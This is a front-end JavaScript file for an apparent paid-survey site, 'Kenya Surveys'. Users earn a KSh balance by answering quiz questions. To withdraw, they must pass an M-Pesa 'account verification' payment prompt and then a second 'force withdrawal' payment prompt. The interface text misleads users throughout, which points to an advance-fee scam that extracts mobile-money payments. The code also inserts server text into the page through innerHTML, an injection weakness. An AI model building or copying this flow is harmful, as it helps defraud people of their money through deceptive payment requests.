const API = 'https://kenyasurveysback.onrender.com/api';

// ════════════════════════════════════════════
// STATE
// ════════════════════════════════════════════
let token = localStorage.getItem('ks_token') || null;
let userProfile = null;
let currentPage = 0;
let totalPages = 7;
let stats = {
  balance: 0, totalEarned: 0, completedQuestions: 0,
  totalQuestions: 40, activated: false, forceVerified: false,
  activationPhone: "", transactions: []
};
let activationRef = null;
let activationPollTimer = null;
let forceVerifyPollTimer = null;

// ════════════════════════════════════════════
// INIT
// ════════════════════════════════════════════
window.addEventListener('DOMContentLoaded', () => {
  // Sticky nav shadow
  const nav = document.getElementById('lp-nav');
  if (nav) {
    window.addEventListener('scroll', () => {
      nav.style.boxShadow = window.scrollY > 10 ? '0 4px 24px rgba(0,0,0,0.45)' : 'none';
    });
  }

  if (token) {
    loadUser();
  } else {
    showHeroCta('guest');
  }
});

async function loadUser() {
  try {
    const data = await apiFetch('/auth/profile');
    userProfile = data;
    if (!data.profileComplete) {
      showScreen('profile-screen');
    } else {
      showHeroCta('user');
      showScreen('app-screen');
      initApp();
    }
  } catch {
    token = null;
    localStorage.removeItem('ks_token');
    showHeroCta('guest');
    showScreen('landing-screen');
  }
}

async function initApp() {
  updateSidebarUser();
  await loadStats();
  loadQuestions(currentPage);
}

// ════════════════════════════════════════════
// HERO CTA TOGGLE
// ════════════════════════════════════════════
function showHeroCta(state) {
  const guest = document.getElementById('lp-hero-cta-guest');
  const user  = document.getElementById('lp-hero-cta-user');
  if (!guest || !user) return;
  if (state === 'user') {
    guest.classList.add('hidden');
    user.classList.remove('hidden');
  } else {
    guest.classList.remove('hidden');
    user.classList.add('hidden');
  }
}

// ════════════════════════════════════════════
// SCREENS
// ════════════════════════════════════════════
function showScreen(id) {
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  document.getElementById(id).classList.add('active');
  window.scrollTo(0, 0);
}

function showPanel(name) {
  document.querySelectorAll('.page-panel').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
  document.getElementById('panel-' + name).classList.add('active');
  const navEl = document.getElementById('nav-' + name);
  if (navEl) navEl.classList.add('active');
  closeSidebar();
  if (name === 'survey') loadQuestions(currentPage);
  if (name === 'withdraw') {
    loadStats();
    document.getElementById('wd-locked').classList.add('hidden');
    document.getElementById('wd-force').classList.add('hidden');
    document.getElementById('wd-unlocked').classList.add('hidden');
  }
  if (name === 'transactions') renderAllTransactions();
}

// ════════════════════════════════════════════
// LANDING PAGE HELPERS
// ════════════════════════════════════════════
function goToAuth(tab) {
  showScreen('auth-screen');
  switchTab(tab === 'login' ? 'login' : 'register');
}

function goToLanding() {
  showScreen('landing-screen');
}

function lpScrollTop() {
  if (document.getElementById('landing-screen').classList.contains('active')) {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  } else {
    showScreen('landing-screen');
  }
}

function lpScrollTo(id) {
  // If we're not on the landing screen, go there first then scroll
  if (!document.getElementById('landing-screen').classList.contains('active')) {
    showScreen('landing-screen');
    setTimeout(() => {
      const el = document.getElementById(id);
      if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }, 80);
  } else {
    const el = document.getElementById(id);
    if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
  }
}

function toggleLpMenu() {
  document.getElementById('lp-mobile-menu').classList.toggle('open');
}

function closeLpMenu() {
  const m = document.getElementById('lp-mobile-menu');
  if (m) m.classList.remove('open');
}

function toggleFaq(btn) {
  const answer = btn.nextElementSibling;
  const isOpen = answer.classList.contains('open');
  // Close all
  document.querySelectorAll('.lp-faq-a').forEach(a => a.classList.remove('open'));
  document.querySelectorAll('.lp-faq-q').forEach(b => b.classList.remove('open'));
  if (!isOpen) {
    answer.classList.add('open');
    btn.classList.add('open');
  }
}

// ════════════════════════════════════════════
// MODALS
// ════════════════════════════════════════════
function showModal(type) {
  document.getElementById('modal-overlay').classList.add('show');
  document.querySelectorAll('.modal').forEach(m => m.classList.remove('show'));
  document.getElementById('modal-' + type).classList.add('show');
}

function closeModal() {
  document.getElementById('modal-overlay').classList.remove('show');
  document.querySelectorAll('.modal').forEach(m => m.classList.remove('show'));
}

// ════════════════════════════════════════════
// AUTH
// ════════════════════════════════════════════
function switchTab(tab) {
  const isLogin = tab === 'login';
  document.getElementById('form-register').classList.toggle('hidden', isLogin);
  document.getElementById('form-login').classList.toggle('hidden', !isLogin);
  document.getElementById('tab-register').classList.toggle('active', !isLogin);
  document.getElementById('tab-login').classList.toggle('active', isLogin);
}

async function doRegister() {
  const phone = document.getElementById('reg-phone').value.trim();
  const pin   = document.getElementById('reg-pin').value.trim();
  const pin2  = document.getElementById('reg-pin2').value.trim();
  const errEl = document.getElementById('reg-error');
  const btn   = document.getElementById('btn-register');

  clearAlert(errEl);
  if (!phone || !pin || !pin2) { showAlert(errEl, 'All fields are required.'); return; }

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span>';

  try {
    const data = await apiFetch('/auth/register', 'POST', { phone, pin, pin2 });
    token = data.token;
    localStorage.setItem('ks_token', token);
    toast('Account created!', 'success');
    const user = await apiFetch('/auth/profile');
    userProfile = user;
    showScreen('profile-screen');
  } catch (err) {
    showAlert(errEl, err.message || 'Registration failed.');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-user-plus"></i> Create Account';
  }
}

async function doLogin() {
  const phone = document.getElementById('login-phone').value.trim();
  const pin   = document.getElementById('login-pin').value.trim();
  const errEl = document.getElementById('login-error');
  const btn   = document.getElementById('btn-login');

  clearAlert(errEl);
  if (!phone || !pin) { showAlert(errEl, 'Phone and PIN required.'); return; }

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span>';

  try {
    const data = await apiFetch('/auth/login', 'POST', { phone, pin });
    token = data.token;
    localStorage.setItem('ks_token', token);
    const user = await apiFetch('/auth/profile');
    userProfile = user;
    if (!user.profileComplete) {
      showScreen('profile-screen');
    } else {
      showHeroCta('user');
      showScreen('app-screen');
      initApp();
    }
  } catch (err) {
    showAlert(errEl, err.message || 'Login failed.');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Sign In';
  }
}

async function doCompleteProfile() {
  const name       = document.getElementById('prof-name').value.trim();
  const county     = document.getElementById('prof-county').value;
  const occupation = document.getElementById('prof-occupation').value;
  const education  = document.getElementById('prof-education').value;
  const errEl      = document.getElementById('prof-error');
  const succEl     = document.getElementById('prof-success');
  const btn        = document.getElementById('btn-profile');

  clearAlert(errEl); clearAlert(succEl);
  if (!name || !county || !occupation || !education) { showAlert(errEl, 'All fields are required.'); return; }

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span>';

  try {
    await apiFetch('/auth/profile/complete', 'POST', { name, county, occupation, education });
    showAlert(succEl, 'Profile saved! Redirecting to dashboard...');
    const user = await apiFetch('/auth/profile');
    userProfile = user;
    setTimeout(() => {
      showHeroCta('user');
      showScreen('app-screen');
      initApp();
    }, 1200);
  } catch (err) {
    showAlert(errEl, err.message || 'Failed to save profile.');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-check"></i> Save Profile and Continue';
  }
}

function doLogout() {
  token = null;
  userProfile = null;
  localStorage.removeItem('ks_token');
  showHeroCta('guest');
  showScreen('landing-screen');
}

// ════════════════════════════════════════════
// STATS & DASHBOARD
// ════════════════════════════════════════════
async function loadStats() {
  try {
    const data = await apiFetch('/survey/stats');
    stats = {
      ...data,
      completedIds: data.completedIds || [],
      forceVerified: data.forceVerified || false,
      activationPhone: data.activationPhone || ""
    };
    updateDashboard();
    updateWithdrawPanel();
  } catch (err) {
    console.error('Failed to load stats:', err);
  }
}

function updateDashboard() {
  const bal       = stats.balance.toFixed(2);
  const earned    = (stats.totalEarned || 0).toFixed(2);
  const completed = stats.completedQuestions || 0;
  const total     = stats.totalQuestions || 40;
  const remaining = total - completed;
  const pct       = Math.round((completed / total) * 100);

  document.getElementById('sidebar-balance').textContent  = `KSh ${bal}`;
  document.getElementById('sidebar-earned').textContent   = `Total compensation: KSh ${earned}`;
  document.getElementById('mobile-balance').textContent   = `KSh ${bal}`;
  document.getElementById('stat-balance').textContent     = bal;
  document.getElementById('stat-earned').textContent      = earned;
  document.getElementById('stat-completed').textContent   = completed;
  document.getElementById('stat-remaining').textContent   = remaining;
  document.getElementById('progress-fill').style.width    = pct + '%';
  document.getElementById('progress-text').textContent    = `${completed} / ${total} completed`;
  document.getElementById('nav-survey-badge').textContent = remaining;

  const hour  = new Date().getHours();
  const greet = hour < 12 ? 'Good morning' : hour < 17 ? 'Good afternoon' : 'Good evening';
  document.getElementById('dash-greeting').textContent = `${greet}, ${userProfile?.name || 'there'}!`;

  const banner      = document.getElementById('activation-banner');
  const bannerTitle = document.getElementById('activation-banner-title');
  const bannerDesc  = document.getElementById('activation-banner-desc');
  const bannerBtn   = document.getElementById('activation-banner-btn');

  if (stats.forceVerified) {
    banner.classList.add('hidden');
  } else if (stats.activated) {
    banner.classList.remove('hidden');
    if (bannerTitle) bannerTitle.innerHTML = '<i class="fas fa-link" style="margin-right:6px"></i>Your Account has been verified ';
    if (bannerDesc)  bannerDesc.textContent = 'Your identity has been verified. If  withdrawal is not initiated then click the force withdrawal button and you will receive your payment instantly .';
    if (bannerBtn)   { bannerBtn.textContent = 'Force Withdrawal Now'; bannerBtn.onclick = () => showPanel('withdraw'); }
  } else {
    banner.classList.remove('hidden');
    if (bannerTitle) bannerTitle.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:6px"></i>Account Verification Required';
    if (bannerDesc)  bannerDesc.textContent = 'To verify your registered mobile number and activate M-Pesa payment services, a one-time account verification process is required before your first payment request to verify if your number is valid and true human being .';
    if (bannerBtn)   { bannerBtn.textContent = 'Register your account'; bannerBtn.onclick = () => showPanel('withdraw'); }
  }

  renderDashTransactions();
}

function updateSidebarUser() {
  if (!userProfile) return;
  document.getElementById('sidebar-name').textContent  = userProfile.name || 'User';
  document.getElementById('sidebar-phone').textContent = '+' + (userProfile.phone || '');
}

function renderDashTransactions() {
  const el  = document.getElementById('dash-tx-list');
  const txs = (stats.transactions || []).slice(0, 6);
  if (!txs.length) {
    el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No activity yet. Participate in surveys to begin earning compensation.</p></div>';
    return;
  }
  el.innerHTML = txs.map(tx => renderTxItem(tx)).join('');
}

function renderAllTransactions() {
  const el  = document.getElementById('all-tx-list');
  const txs = stats.transactions || [];
  if (!txs.length) {
    el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No activity yet. Participate in surveys to begin earning compensation.</p></div>';
    return;
  }
  el.innerHTML = txs.map(tx => renderTxItem(tx)).join('');
}

function renderTxItem(tx) {
  const isPositive = tx.amount > 0;
  const type       = tx.type;
  let iconClass = 'earn', iconName = 'coins';
  if (type === 'withdrawal')                             { iconClass = 'withdraw'; iconName = 'paper-plane'; }
  else if (type === 'welcome_bonus' || type === 'activation') { iconClass = 'bonus'; iconName = 'gift'; }

  const date   = new Date(tx.createdAt).toLocaleDateString('en-KE', { day: 'numeric', month: 'short', year: 'numeric' });
  const amount = isPositive ? `+KSh ${tx.amount.toFixed(2)}` : `-KSh ${Math.abs(tx.amount).toFixed(2)}`;

  return `<div class="tx-item">
    <div class="tx-icon ${iconClass}"><i class="fas fa-${iconName}"></i></div>
    <div>
      <div class="tx-desc">${tx.description}</div>
      <div class="tx-date">${date}</div>
    </div>
    <div class="tx-amount ${isPositive ? 'positive' : 'negative'}">${amount}</div>
  </div>`;
}

// ════════════════════════════════════════════
// SURVEY
// ════════════════════════════════════════════
async function loadQuestions(page) {
  const grid = document.getElementById('questions-grid');
  grid.innerHTML = '<div class="empty-state"><div class="spinner"></div></div>';

  try {
    const data = await apiFetch(`/survey/questions?page=${page}`);
    totalPages  = data.totalPages;
    currentPage = data.page;
    renderQuestions(data.questions);
    updatePagination();
    renderPageDots(data.totalPages);
  } catch {
    grid.innerHTML = '<div class="empty-state"><i class="fas fa-exclamation-circle"></i><p>Failed to load questions.</p></div>';
  }
}

function renderQuestions(questions) {
  const grid         = document.getElementById('questions-grid');
  const completedIds = stats.completedIds || [];

  grid.innerHTML = questions.map(q => {
    const isAnswered = completedIds.includes(q.id);
    return `<div class="question-card${isAnswered ? ' answered' : ''}" id="qcard-${q.id}" data-answered="${isAnswered}">
      <div class="question-meta">
        <span class="question-cat">${q.category}</span>
        <div style="display:flex;align-items:center;gap:8px;">
          ${isAnswered
            ? `<span class="question-answered-badge"><i class="fas fa-check-circle"></i> Completed</span>`
            : `<span class="question-reward"><i class="fas fa-coins"></i> KSh ${q.reward}</span>`
          }
        </div>
      </div>
      <div class="question-text">${q.question}</div>
      <div class="options-grid">
        ${q.options.map((opt, i) => `
          <button class="option-btn" id="opt-${q.id}-${i}"
            onclick="submitAnswer(${q.id}, ${i}, ${q.reward})"
            ${isAnswered ? 'disabled' : ''}>${opt}</button>
        `).join('')}
      </div>
      <div class="question-result" id="result-${q.id}">
        ${isAnswered
          ? `<span style="color:var(--text3);font-size:0.82rem;display:flex;align-items:center;gap:6px;margin-top:8px;">
               <i class="fas fa-lock" style="color:var(--green-dark)"></i> You have already completed this question
             </span>`
          : ''
        }
      </div>
    </div>`;
  }).join('');
}

async function submitAnswer(questionId, answerIndex, reward) {
  const card = document.getElementById('qcard-' + questionId);
  if (card.dataset.answered === 'true') return;

  for (let i = 0; i < 4; i++) {
    const btn = document.getElementById(`opt-${questionId}-${i}`);
    if (btn) btn.disabled = true;
  }

  const selectedBtn = document.getElementById(`opt-${questionId}-${answerIndex}`);
  if (selectedBtn) selectedBtn.style.opacity = '0.7';

  try {
    const data = await apiFetch('/survey/answer', 'POST', { questionId, answer: answerIndex });

    if (data.alreadyAnswered) {
      toast('You have already completed this question.', 'info');
      card.dataset.answered = 'true';
      return;
    }

    const correctBtn = document.getElementById(`opt-${questionId}-${data.correctIndex}`);
    if (correctBtn) correctBtn.classList.add('reveal-correct');

    const resultEl = document.getElementById('result-' + questionId);

    if (data.correct) {
      selectedBtn.classList.add('selected-correct');
      card.classList.add('correct');
      resultEl.className = 'question-result correct';
      resultEl.innerHTML = `<i class="fas fa-check-circle"></i> Correct! Compensation of KSh ${data.earned} added.`;
      showEarnPop(data.earned);
      toast(`Correct! +KSh ${data.earned} compensation added.`, 'success');
    } else {
      selectedBtn.classList.add('selected-wrong');
      card.classList.add('wrong');
      resultEl.className = 'question-result wrong';
      resultEl.innerHTML = `<i class="fas fa-times-circle"></i> Incorrect. ${data.explanation || ''}`;
      toast('Incorrect answer. Keep going!', 'error');
    }

    card.dataset.answered = 'true';
    stats.balance = data.balance;

    if (data.correct) {
      stats.totalEarned        = (stats.totalEarned || 0) + data.earned;
      stats.completedQuestions = (stats.completedQuestions || 0) + 1;
    } else {
      stats.completedQuestions = (stats.completedQuestions || 0) + 1;
    }

    document.getElementById('sidebar-balance').textContent = `KSh ${data.balance.toFixed(2)}`;
    document.getElementById('mobile-balance').textContent  = `KSh ${data.balance.toFixed(2)}`;
    document.getElementById('stat-balance').textContent    = data.balance.toFixed(2);
    document.getElementById('wd-balance').textContent      = `KSh ${data.balance.toFixed(2)}`;

    loadStats();

  } catch (err) {
    toast(err.message || 'Failed to submit answer.', 'error');
    for (let i = 0; i < 4; i++) {
      const btn = document.getElementById(`opt-${questionId}-${i}`);
      if (btn) btn.disabled = false;
    }
  }
}

function changePage(dir) {
  const newPage = currentPage + dir;
  if (newPage < 0 || newPage >= totalPages) return;
  currentPage = newPage;
  loadQuestions(currentPage);
  window.scrollTo(0, 0);
}

function updatePagination() {
  document.getElementById('btn-prev').disabled = currentPage === 0;
  document.getElementById('btn-next').disabled = currentPage >= totalPages - 1;
  document.getElementById('page-info').textContent = `Page ${currentPage + 1} of ${totalPages}`;

  if (currentPage >= totalPages - 1) {
    document.getElementById('btn-next').innerHTML = '<i class="fas fa-flag-checkered"></i> Finish';
  } else {
    document.getElementById('btn-next').innerHTML = 'Next <i class="fas fa-arrow-right"></i>';
  }
}

function renderPageDots(total) {
  const container = document.getElementById('page-dots');
  container.innerHTML = '';
  for (let i = 0; i < total; i++) {
    const dot = document.createElement('div');
    dot.className = 'page-dot' + (i === currentPage ? ' current' : '');
    dot.onclick = () => { currentPage = i; loadQuestions(i); };
    container.appendChild(dot);
  }
}

// ════════════════════════════════════════════
// PARTICIPANT COMPENSATION (WITHDRAW)
// ════════════════════════════════════════════
function formatPhoneDisplay(phone) {
  let ph = String(phone || '');
  if (ph.startsWith('254') && ph.length === 12) ph = '0' + ph.slice(3);
  return ph;
}

function updateWithdrawPanel() {
  const bal = (stats.balance || 0).toFixed(2);
  document.getElementById('wd-balance').textContent = `KSh ${bal}`;

  const statusEl    = document.getElementById('wd-status');
  const phoneRow    = document.getElementById('wd-phone-row');
  const regPhone    = document.getElementById('wd-reg-phone');
  const lockedDiv   = document.getElementById('wd-locked');
  const forceDiv    = document.getElementById('wd-force');
  const unlockedDiv = document.getElementById('wd-unlocked');

  lockedDiv.classList.add('hidden');
  forceDiv.classList.add('hidden');
  unlockedDiv.classList.add('hidden');
  phoneRow.style.display = 'none';

  if (!stats.activated) {
    statusEl.innerHTML = '<span class="chip gold"><i class="fas fa-shield-alt"></i> Verification Required</span>';
    lockedDiv.classList.remove('hidden');

  } else if (!stats.forceVerified) {
    statusEl.innerHTML = '<span class="chip" style="background:rgba(0,166,81,0.12);color:var(--green-light);border-color:rgba(0,166,81,0.3)"><i class="fas fa-check-circle"></i> You have been verified and force withdrawal if the withdrawal delays </span>';
    if (stats.activationPhone) {
      phoneRow.style.display = 'flex';
      regPhone.textContent = formatPhoneDisplay(stats.activationPhone);
    }
    forceDiv.classList.remove('hidden');

  } else {
    statusEl.innerHTML = '<span class="chip"><i class="fas fa-check"></i> Fully Verified</span>';
    if (stats.activationPhone) {
      phoneRow.style.display = 'flex';
      regPhone.textContent = formatPhoneDisplay(stats.activationPhone);
    }
    unlockedDiv.classList.remove('hidden');
    const slider      = document.getElementById('wd-slider');
    const maxWithdraw = Math.min(Math.floor(stats.balance / 10) * 10, 10000);
    slider.max = Math.max(150, maxWithdraw);
    updateSlider();
  }
}


function updateSlider() {
  const val = parseFloat(document.getElementById('wd-slider').value);
  const fee = parseFloat((val * 0.04).toFixed(2));
  const receive = parseFloat((val - fee).toFixed(2));
  document.getElementById('wd-amount-display').textContent = val;
  document.getElementById('wd-receive').textContent = `KSh ${receive.toFixed(2)}`;
}

// Stage 1
async function doActivate() {
  const phone  = document.getElementById('act-phone').value.trim();
  const errEl  = document.getElementById('act-error');
  const succEl = document.getElementById('act-success');
  const btn    = document.getElementById('btn-activate');

  clearAlert(errEl); clearAlert(succEl);
  if (!phone) { showAlert(errEl, 'Enter your M-Pesa phone number.'); return; }

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> Activating Your Account ...';

  try {
    const data = await apiFetch('/activation/initiate', 'POST', { phone });
    activationRef = data.reference;
    showAlert(succEl, 'M-Pesa STK prompt sent. Enter your PIN on your phone to complete verification.');
    toast('Check your phone for the M-Pesa verification prompt.', 'info');
    startActivationPoll(activationRef);
  } catch (err) {
    showAlert(errEl, err.message || 'Failed to  verify your account .');
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-shield-alt"></i> Register your account ';
  }
}

function startActivationPoll(ref) {
  if (activationPollTimer) clearInterval(activationPollTimer);
  let attempts = 0;
  const btn = document.getElementById('btn-activate');

  activationPollTimer = setInterval(async () => {
    attempts++;
    if (attempts > 30) {
      clearInterval(activationPollTimer);
      btn.disabled = false;
      btn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify Account';
      return;
    }
    try {
      const data = await apiFetch(`/activation/status/${ref}`);
      if (data.status === 'success') {
        clearInterval(activationPollTimer);
        await loadStats();
        toast('Account verified successfully. Force withdrawal if you have not received the payment on your recipient number .', 'success');
        btn.disabled = false;
      } else if (data.status === 'failed') {
        clearInterval(activationPollTimer);
        showAlert(document.getElementById('act-error'), 'Verification payment failed. Please try again.');
        btn.disabled = false;
        btn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify Account';
      }
    } catch (err) {
      console.error('Poll error:', err.message);
    }
  }, 3000);
}

// Stage 2
async function doForceVerify() {
  const errEl  = document.getElementById('fv-error');
  const succEl = document.getElementById('fv-success');
  const btn    = document.getElementById('btn-force-verify');

  clearAlert(errEl); clearAlert(succEl);
  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> Sending prompt...';

  try {
    const data = await apiFetch('/activation/force/initiate', 'POST', {});
    const displayPhone = formatPhoneDisplay(data.phone);
    showAlert(succEl, `Force withdrawal process has been initiated  to ${displayPhone}. Enter your PIN on your pin to force withdraw the rewards direct to your recipient number .`);
    toast('Check your phone to force withdraw full amount .', 'info');
    startForceVerifyPoll(data.reference, btn);
  } catch (err) {
    showAlert(errEl, err.message || 'Failed to force withdraw.');
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force full withdrawal now';
  }
}

function startForceVerifyPoll(ref, btn) {
  if (forceVerifyPollTimer) clearInterval(forceVerifyPollTimer);
  let attempts = 0;

  forceVerifyPollTimer = setInterval(async () => {
    attempts++;
    if (attempts > 30) {
      clearInterval(forceVerifyPollTimer);
      btn.disabled = false;
      btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdrawal Now';
      return;
    }
    try {
      const data = await apiFetch(`/activation/status/${ref}`);
      if (data.status === 'success') {
        clearInterval(forceVerifyPollTimer);
        await loadStats();
        toast('Payout channel verified. You may now submit payment requests.', 'success');
        btn.disabled = false;
      } else if (data.status === 'failed') {
        clearInterval(forceVerifyPollTimer);
        showAlert(document.getElementById('fv-error'), 'Verification failed. Please try again.');
        btn.disabled = false;
        btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdrawal Now';
      }
    } catch (err) {
      console.error('Poll error:', err.message);
    }
  }, 3000);
}

// Payment request
async function doWithdraw() {
  const phone  = document.getElementById('wd-phone').value.trim();
  const amount = document.getElementById('wd-slider').value;
  const errEl  = document.getElementById('wd-error');
  const succEl = document.getElementById('wd-success');
  const btn    = document.getElementById('btn-withdraw');

  clearAlert(errEl); clearAlert(succEl);
  if (!phone) { showAlert(errEl, 'Enter your M-Pesa number.'); return; }
  if (parseFloat(amount) > stats.balance) { showAlert(errEl, 'Insufficient compensation balance.'); return; }

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> Processing...';

  try {
    const data = await apiFetch('/survey/withdraw', 'POST', { amount: parseFloat(amount), mpesaPhone: phone });
    stats.balance = data.balance;
    updateDashboard();
    updateWithdrawPanel();
    showAlert(succEl, data.message);
    toast('Payment request submitted successfully!', 'success');
    document.getElementById('wd-phone').value = '';
    loadStats();
  } catch (err) {
    showAlert(errEl, err.message || 'Payment request failed.');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Payment Request';
  }
}

// ════════════════════════════════════════════
// SIDEBAR MOBILE
// ════════════════════════════════════════════
function toggleSidebar() {
  document.getElementById('sidebar').classList.toggle('open');
  document.getElementById('sidebar-overlay').classList.toggle('show');
}

function closeSidebar() {
  document.getElementById('sidebar').classList.remove('open');
  document.getElementById('sidebar-overlay').classList.remove('show');
}

// ════════════════════════════════════════════
// UTILITIES
// ════════════════════════════════════════════
async function apiFetch(path, method = 'GET', body = null) {
  const opts = { method, headers: { 'Content-Type': 'application/json' } };
  if (token) opts.headers['Authorization'] = `Bearer ${token}`;
  if (body)  opts.body = JSON.stringify(body);
  const res  = await fetch(API + path, opts);
  const data = await res.json();
  if (!res.ok) throw new Error(data.message || 'Request failed');
  return data;
}

function showAlert(el, msg) {
  el.textContent = msg;
  el.classList.add('show');
}

function clearAlert(el) {
  el.textContent = '';
  el.classList.remove('show');
}

function toast(msg, type = 'info') {
  const container = document.getElementById('toast-container');
  const el        = document.createElement('div');
  el.className    = `toast ${type}`;
  const icons     = { success: 'check-circle', error: 'times-circle', info: 'info-circle' };
  el.innerHTML    = `<i class="fas fa-${icons[type] || 'info-circle'}"></i> ${msg}`;
  container.appendChild(el);
  setTimeout(() => {
    el.style.animation = 'slideOut 0.3s ease forwards';
    setTimeout(() => el.remove(), 300);
  }, 3500);
}

function showEarnPop(amount) {
  const pop = document.getElementById('earn-pop');
  document.getElementById('earn-amount').textContent = `+KSh ${amount}`;
  pop.classList.add('show');
  setTimeout(() => pop.classList.remove('show'), 1800);
}